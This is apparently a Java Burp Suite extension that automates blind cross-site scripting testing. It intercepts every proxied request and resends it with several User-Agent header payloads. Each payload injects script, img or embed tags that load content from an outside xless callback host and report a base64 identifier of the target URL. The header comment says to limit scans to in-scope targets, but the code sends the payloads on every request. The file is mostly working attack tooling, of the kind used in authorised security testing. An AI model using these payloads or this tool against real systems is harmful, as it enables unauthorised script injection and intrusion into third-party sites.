/*
 * Blind XSS automated using Burp Suite
 * The extension intercepts every request that comes through burp and resends it with a bXSS payload
 * 
 * BXSS in User-Agent, Referrer, Origin, X-Forwarded-For,etc 
 * 
 * 1. Add only in-scope scans
 * 2. Dont test on .ico,.png,.jpg,etc files
 *  
 * 
 */

package burp;

import burp.IBurpExtender;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import java.util.List;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;

public class BurpExtender implements IBurpExtender, IProxyListener
{
	private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
    	this.callbacks = callbacks;
    	this.helpers = callbacks.getHelpers();
        
        callbacks.setExtensionName("Blind XSS on User-Agent");
        
        //Intercept a request from the Proxy and add your payload
        callbacks.registerProxyListener(this);
    }

    @Override
    public void processProxyMessage(boolean messageIsRequest, IInterceptedProxyMessage message)
    {
    	if(messageIsRequest)
        {
			IHttpRequestResponse httpService = message.getMessageInfo();
            IRequestInfo requestInfo = helpers.analyzeRequest(httpService);
            List<String> headers = requestInfo.getHeaders();
            String reqRaw = new String(httpService.getRequest());
            String reqBody = reqRaw.substring(requestInfo.getBodyOffset());

            /*
            String content = null;
            for(int i=0;i<headers.size();i++)
            {
                if(headers.get(i).contains("User-Agent"))
                {
                	content = headers.get(i);
                	headers.remove(i);
                }
            }*/

            //build base64 payload/identifier
            URL host = requestInfo.getUrl();
            String identifier = host + " in User-Agent ";
            String encoded = null;

            try
            {
                encoded = Base64.getEncoder().encodeToString(identifier.getBytes("utf-8"));
            }
            catch(Exception e)
            {
                System.out.println("Encoding failed...");
            }
            
            List<String> payloads = new ArrayList<String>();

            payloads.add("User-Agent: Mozilla/5.0\"><script src=https://xless.an1sor0pous.now.sh/?from=" + encoded + "></script>");
            payloads.add("User-Agent: Mozilla/5.0'><script/src=https://xless.an1sor0pous.now.sh/?from=" + encoded + "></script>");
            payloads.add("User-Agent: Mozilla/5.0 <script>$.getScript('https://xless.an1sor0pous.now.sh/jq.js?from=" + encoded + "')</script>");
            payloads.add("User-Agent: Mozilla/5.0\"><img/src=https://xless.an1sor0pous.now.sh/call.img/?from=" + encoded + ">");
            payloads.add("User-Agent: Mozilla/5.0 <embed src=https://xless.an1sor0pous.now.sh/test.img?from=" + encoded + ">");
                        
        	for (int k=0;k<payloads.size();k++)
        	{
        		for(int i=0;i<headers.size();i++)
        		{
                    if(headers.get(i).contains("User-Agent"))
                    {
                       headers.remove(i);
                    }
        		}
        		
    			headers.add(payloads.get(k));
            	byte[] request = helpers.buildHttpMessage(headers, reqBody.getBytes());
            	callbacks.makeHttpRequest(httpService.getHttpService(), request);
            }
        }
    }
}
